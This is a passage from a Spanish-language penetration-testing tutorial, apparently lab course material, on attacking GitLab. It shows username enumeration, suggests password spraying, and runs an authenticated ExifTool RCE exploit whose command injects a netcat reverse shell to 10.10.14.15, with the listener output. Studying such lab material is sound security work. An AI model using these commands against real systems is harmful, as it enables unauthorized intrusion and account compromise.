Como vimos en la sección anterior, incluso el acceso no autenticado a una instancia de GitLab podría llevar a la exposición de datos sensibles. Si logramos acceder como un usuario válido de la empresa o un administrador, podríamos potencialmente descubrir suficiente información para comprometer completamente la organización de alguna manera. GitLab tiene [553 CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html) reportados hasta septiembre de 2021. Aunque no todos son explotables, ha habido varios severos a lo largo de los años que podrían llevar a la ejecución remota de código.

---

## Username Enumeration

Aunque GitLab no lo considera una vulnerabilidad como se ve en su página de [Hackerone](https://hackerone.com/gitlab?type=team) ("User and project enumeration/path disclosure unless an additional impact can be demonstrated"), sigue siendo algo que vale la pena verificar ya que podría resultar en acceso si los usuarios eligen contraseñas débiles. Podemos hacerlo manualmente, por supuesto, pero los scripts hacen nuestro trabajo mucho más rápido. Podemos escribir uno nosotros mismos en Bash o Python o usar [este](https://www.exploit-db.com/exploits/49821) para enumerar una lista de usuarios válidos. La versión en Python3 de esta misma herramienta se puede encontrar [aquí](https://github.com/dpgg101/GitLabUserEnum). Como con cualquier tipo de ataque de password spraying, debemos tener en cuenta el bloqueo de cuentas y otros tipos de interrupciones. Los valores predeterminados de GitLab están configurados para 10 intentos fallidos que resultan en un desbloqueo automático después de 10 minutos. Esto se puede ver [aquí](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/initializers/8_devise.rb). Esto puede cambiarse, pero GitLab tendría que ser compilado desde la fuente. En este momento, no hay forma de cambiar esta configuración desde la UI del administrador, pero un administrador puede modificar la longitud mínima de la contraseña, lo que podría ayudar con los usuarios que eligen contraseñas cortas y comunes, pero no mitigará completamente el riesgo de ataques de contraseña.

```r
# Number of authentication tries before locking an account if lock_strategy
# is failed attempts.
config.maximum_attempts = 10

# Time interval to unlock the account if :time is enabled as unlock_strategy.
config.unlock_in = 10.minutes
```

Descargando el script y ejecutándolo contra la instancia de GitLab objetivo, vemos que hay dos nombres de usuario válidos, `root` (la cuenta de administrador integrada) y `bob`. Si logramos obtener una lista grande de usuarios, podríamos intentar un ataque controlado de password spraying con contraseñas débiles y comunes como `Welcome1` o `Password123`, etc., o intentar reutilizar credenciales obtenidas de otras fuentes como filtraciones de datos públicos.

```r
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  			             GitLab User Enumeration Script
   	    			             Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302
```

---

## Authenticated Remote Code Execution

Las vulnerabilidades de ejecución remota de código suelen considerarse la "crema de la crema" ya que el acceso al servidor subyacente probablemente nos otorgará acceso a todos los datos que residen en él (aunque es posible que necesitemos escalar privilegios primero) y puede servir como un punto de apoyo en la red para lanzar más ataques contra otros sistemas y potencialmente resultar en un compromiso total de la red. GitLab Community Edition versión 13.10.2 y anteriores sufrieron una vulnerabilidad de ejecución remota de código autenticada [vulnerability](https://hackerone.com/reports/1154542) debido a un problema con ExifTool manejando metadatos en archivos de imagen subidos. Este problema fue solucionado rápidamente por GitLab, pero es probable que algunas empresas aún utilicen una versión vulnerable. Podemos usar este [exploit](https://www.exploit-db.com/exploits/49951) para lograr RCE.

Como se trata de una ejecución remota de código autenticada, primero necesitamos un nombre de usuario y una contraseña válidos. En algunos casos, esto solo funcionará si podemos obtener credenciales válidas a través de OSINT o un ataque de adivinación de credenciales. Sin embargo, si encontramos una versión vulnerable de GitLab que permita el registro automático, podemos registrarnos rápidamente para una cuenta y llevar a cabo el ataque.

```r
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

Y obtenemos una shell casi instantáneamente.

```r
nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id

id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets
```